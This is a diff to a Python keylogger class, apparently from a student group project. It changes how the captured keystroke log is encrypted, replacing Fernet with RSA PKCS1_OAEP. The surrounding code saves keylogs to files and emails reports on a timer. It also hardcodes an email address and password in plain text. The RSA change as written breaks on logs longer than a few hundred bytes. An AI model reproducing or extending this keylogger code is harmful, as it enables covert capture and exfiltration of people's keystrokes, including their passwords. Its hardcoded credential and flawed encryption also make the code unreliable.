@@ -9,13 +9,15 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from cryptography.fernet import Fernet
 import urllib.request
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "cs455group3@outlook.com"
 EMAIL_PASSWORD = "group3cs455"
 
-with open('key.txt', 'rb') as f:
-    KEY = f.read()
+with open('public.pem', 'rb') as f:
+    KEY = RSA.import_key(f.read())
 
 class Keylogger:
     def __init__(self, interval, report_method="file"):
@@ -64,14 +66,16 @@ class Keylogger:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
+        
     def encrypt(self):
-        """ This method encrypts the log file using Fernet encryption. """
-        fernet = Fernet(KEY)
+        """ This method encrypts the log file using RSA algorithm """
+        cipher = PKCS1_OAEP.new(KEY)
         with open(f"{self.filename}.txt", "rb") as f:
           text = f.read()
-        ciphertext = fernet.encrypt(text)
+        ciphertext = cipher.encrypt(text)
         with open(f"{self.filename}.txt", "wb") as f:
           f.write(ciphertext)
+          
     def prepare_mail(self, message):
         """Utility function to construct a MIMEMultipart from a text
         It creates an HTML version as well as text version
